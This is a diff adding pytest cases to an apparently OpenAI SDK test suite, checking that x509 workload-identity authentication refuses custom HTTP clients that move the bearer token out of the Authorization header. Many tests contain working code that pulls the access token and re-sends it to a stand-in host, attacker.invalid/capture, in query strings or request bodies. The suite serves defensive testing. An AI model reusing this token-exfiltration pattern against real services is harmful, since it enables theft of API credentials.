@@ -328,6 +328,267 @@ async def test_async_x509_rejects_recursively_reconstructed_protected_requests(
     assert [str(request.url) for request in requests] == [_TOKEN_URL]
 
 
+@pytest.mark.parametrize("credential_location", ["query", "query_key", "body", "encoded_body"])
+@pytest.mark.parametrize("change_headers", [False, True])
+@pytest.mark.parametrize("change_method", [False, True])
+@pytest.mark.parametrize("use_client_builder", [False, True])
+def test_sync_x509_rejects_recursive_rebuilds_that_move_credentials_outside_headers(
+    credential_location: str, change_headers: bool, change_method: bool, use_client_builder: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                url = "https://attacker.invalid/capture"
+                if credential_location == "query":
+                    url = f"{url}?credential={access_token}"
+                elif credential_location == "query_key":
+                    url = f"{url}?{access_token}=1"
+                content = None
+                if credential_location == "body":
+                    content = access_token.encode()
+                elif credential_location == "encoded_body":
+                    content = access_token.replace("-", "%2D").encode()
+                method = "POST" if change_method else request.method
+                headers = {name: value for name, value in request.headers.items() if name.lower() != "authorization"}
+                if use_client_builder:
+                    copied = self.build_request(method, url, headers=headers, content=content)
+                else:
+                    copied = httpx2.Request(method, url, headers=headers, content=content)
+                copied.headers["host"] = "attacker.invalid"
+                if change_headers:
+                    copied.headers["User-Agent"] = "reconstructed-client/1"
+                return self.send(copied, **kwargs)
+            return super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("credential_location", ["query", "query_key", "body", "encoded_body"])
+@pytest.mark.parametrize("change_headers", [False, True])
+@pytest.mark.parametrize("change_method", [False, True])
+@pytest.mark.parametrize("use_client_builder", [False, True])
+async def test_async_x509_rejects_recursive_rebuilds_that_move_credentials_outside_headers(
+    credential_location: str, change_headers: bool, change_method: bool, use_client_builder: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                url = "https://attacker.invalid/capture"
+                if credential_location == "query":
+                    url = f"{url}?credential={access_token}"
+                elif credential_location == "query_key":
+                    url = f"{url}?{access_token}=1"
+                content = None
+                if credential_location == "body":
+                    content = access_token.encode()
+                elif credential_location == "encoded_body":
+                    content = access_token.replace("-", "%2D").encode()
+                method = "POST" if change_method else request.method
+                headers = {name: value for name, value in request.headers.items() if name.lower() != "authorization"}
+                if use_client_builder:
+                    copied = self.build_request(method, url, headers=headers, content=content)
+                else:
+                    copied = httpx2.Request(method, url, headers=headers, content=content)
+                copied.headers["host"] = "attacker.invalid"
+                if change_headers:
+                    copied.headers["User-Agent"] = "reconstructed-client/1"
+                return await self.send(copied, **kwargs)
+            return await super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("query_key", [False, True])
+def test_sync_x509_rejects_recursive_query_credentials_with_literal_plus(query_key: bool) -> None:
+    requests: list[httpx2.Request] = []
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            return httpx2.Response(200, request=request, json={"access_token": "alpha+bravo", "expires_in": 3600})
+        return _response(request)
+
+    class ReconstructingClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                query = f"{access_token}=1" if query_key else f"credential={access_token}"
+                return self.send(httpx2.Request("POST", f"https://attacker.invalid/capture?{query}"), **kwargs)
+            return super().send(request, **kwargs)
+
+    transport = ReconstructingClient(transport=httpx2.MockTransport(handler))
+    with OpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("query_key", [False, True])
+async def test_async_x509_rejects_recursive_query_credentials_with_literal_plus(query_key: bool) -> None:
+    requests: list[httpx2.Request] = []
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            return httpx2.Response(200, request=request, json={"access_token": "alpha+bravo", "expires_in": 3600})
+        return _response(request)
+
+    class ReconstructingClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                query = f"{access_token}=1" if query_key else f"credential={access_token}"
+                return await self.send(httpx2.Request("POST", f"https://attacker.invalid/capture?{query}"), **kwargs)
+            return await super().send(request, **kwargs)
+
+    transport = ReconstructingClient(transport=httpx2.MockTransport(handler))
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("percent_encode", [False, True])
+@pytest.mark.parametrize("use_client_builder", [False, True])
+def test_sync_x509_rejects_recursive_credential_bodies_matching_auxiliary_requests(
+    percent_encode: bool, use_client_builder: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                url = "https://attacker.invalid/capture"
+                self.build_request("POST", url)
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                content = access_token.replace("-", "%2D").encode() if percent_encode else access_token.encode()
+                if use_client_builder:
+                    copied = self.build_request("POST", url, content=content)
+                else:
+                    copied = httpx2.Request("POST", url, content=content)
+                return self.send(copied, **kwargs)
+            return super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("percent_encode", [False, True])
+@pytest.mark.parametrize("use_client_builder", [False, True])
+async def test_async_x509_rejects_recursive_credential_bodies_matching_auxiliary_requests(
+    percent_encode: bool, use_client_builder: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                url = "https://attacker.invalid/capture"
+                self.build_request("POST", url)
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                content = access_token.replace("-", "%2D").encode() if percent_encode else access_token.encode()
+                if use_client_builder:
+                    copied = self.build_request("POST", url, content=content)
+                else:
+                    copied = httpx2.Request("POST", url, content=content)
+                return await self.send(copied, **kwargs)
+            return await super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("credential_location", ["query", "body", "encoded_body"])
+def test_sync_x509_rejects_recursive_credential_rebuilds_in_fresh_threads(credential_location: str) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                url = "https://attacker.invalid/capture"
+                content = None
+                if credential_location == "query":
+                    url = f"{url}?credential={access_token.replace('-', '%2D')}"
+                elif credential_location == "encoded_body":
+                    content = access_token.replace("-", "%2D").encode()
+                else:
+                    content = access_token.encode()
+                copied = httpx2.Request("POST", url, content=content)
+                with ThreadPoolExecutor(max_workers=1) as executor:
+                    return executor.submit(self.send, copied, **kwargs).result()
+            return super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("credential_location", ["query", "body", "encoded_body"])
+async def test_async_x509_rejects_recursive_credential_rebuilds_in_fresh_contexts(credential_location: str) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                access_token = request.headers["Authorization"].removeprefix("Bearer ")
+                url = "https://attacker.invalid/capture"
+                content = None
+                if credential_location == "query":
+                    url = f"{url}?credential={access_token.replace('-', '%2D')}"
+                elif credential_location == "encoded_body":
+                    content = access_token.replace("-", "%2D").encode()
+                else:
+                    content = access_token.encode()
+                copied = httpx2.Request("POST", url, content=content)
+                return await Context().run(asyncio.create_task, self.send(copied, **kwargs))
+            return await super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
 @pytest.mark.parametrize("redirect", [False, True])
 @pytest.mark.parametrize("delegate_storage", ["attribute", "slot", "private_slot", "list", "dict"])
 @pytest.mark.parametrize("reconstruct", [False, True])
@@ -1944,6 +2205,134 @@ async def test_async_x509_allows_concurrent_origins_with_the_same_access_token()
     clients = [
         AsyncOpenAI(workload_identity=_identity(), http_client=transport, base_url=origin, max_retries=0)
         for origin in ("https://mtls.api.openai.com/v1", "https://mtls-us.api.openai.com/v1")
+    ]
+
+    assert [result.object for result in await asyncio.gather(*(client.models.list() for client in clients))] == [
+        "list",
+        "list",
+    ]
+
+
+@pytest.mark.parametrize("short_token", ["v1", "models"])
+def test_sync_x509_allows_auxiliary_url_paths_that_match_short_tokens(short_token: str) -> None:
+    requests: list[httpx2.Request] = []
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            return httpx2.Response(200, request=request, json={"access_token": short_token, "expires_in": 3600})
+        return _response(request)
+
+    class TelemetryClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                assert self.get("https://telemetry.example/v1/models").status_code == 200
+            return super().send(request, **kwargs)
+
+    transport = TelemetryClient(transport=httpx2.MockTransport(handler))
+    with OpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
+        assert client.models.list().object == "list"
+
+    assert [request.url.host for request in requests] == [
+        "mtls.auth.openai.com",
+        "telemetry.example",
+        "mtls.api.openai.com",
+    ]
+
+
+@pytest.mark.parametrize("short_token", ["v1", "models"])
+async def test_async_x509_allows_auxiliary_url_paths_that_match_short_tokens(short_token: str) -> None:
+    requests: list[httpx2.Request] = []
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            return httpx2.Response(200, request=request, json={"access_token": short_token, "expires_in": 3600})
+        return _response(request)
+
+    class TelemetryClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                assert (await self.get("https://telemetry.example/v1/models")).status_code == 200
+            return await super().send(request, **kwargs)
+
+    transport = TelemetryClient(transport=httpx2.MockTransport(handler))
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
+        assert (await client.models.list()).object == "list"
+
+    assert [request.url.host for request in requests] == [
+        "mtls.auth.openai.com",
+        "telemetry.example",
+        "mtls.api.openai.com",
+    ]
+
+
+@pytest.mark.parametrize("short_token", ["v1", "models"])
+def test_sync_x509_preserves_exact_identity_when_another_token_matches_the_url(short_token: str) -> None:
+    both_active = threading.Barrier(2)
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        if str(request.url) == _TOKEN_URL:
+            identity = json.loads(request.content)["identity_provider_id"]
+            token = short_token if identity.endswith("-one") else "long-token"
+            return httpx2.Response(200, request=request, json={"access_token": token, "expires_in": 3600})
+        return _response(request)
+
+    class ConcurrentClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            both_active.wait(timeout=5)
+            return super().send(request, **kwargs)
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(handler))
+    clients = [
+        OpenAI(
+            workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
+            http_client=transport,
+            base_url="https://mtls-us.api.openai.com/v1" if suffix == "two" else None,
+            max_retries=0,
+        )
+        for suffix in ("one", "two")
+    ]
+
+    with ThreadPoolExecutor(max_workers=2) as executor:
+        results = [executor.submit(client.models.list) for client in clients]
+        assert [result.result(timeout=5).object for result in results] == ["list", "list"]
+
+
+@pytest.mark.parametrize("short_token", ["v1", "models"])
+async def test_async_x509_preserves_exact_identity_when_another_token_matches_the_url(short_token: str) -> None:
+    active_count = 0
+    both_active = asyncio.Event()
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        if str(request.url) == _TOKEN_URL:
+            identity = json.loads(request.content)["identity_provider_id"]
+            token = short_token if identity.endswith("-one") else "long-token"
+            return httpx2.Response(200, request=request, json={"access_token": token, "expires_in": 3600})
+        return _response(request)
+
+    class ConcurrentClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            nonlocal active_count
+            active_count += 1
+            if active_count == 2:
+                both_active.set()
+            await asyncio.wait_for(both_active.wait(), timeout=5)
+            return await super().send(request, **kwargs)
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(handler))
+    clients = [
+        AsyncOpenAI(
+            workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
+            http_client=transport,
+            base_url="https://mtls-us.api.openai.com/v1" if suffix == "two" else None,
+            max_retries=0,
+        )
+        for suffix in ("one", "two")
     ]
 
     assert [result.object for result in await asyncio.gather(*(client.models.list() for client in clients))] == [
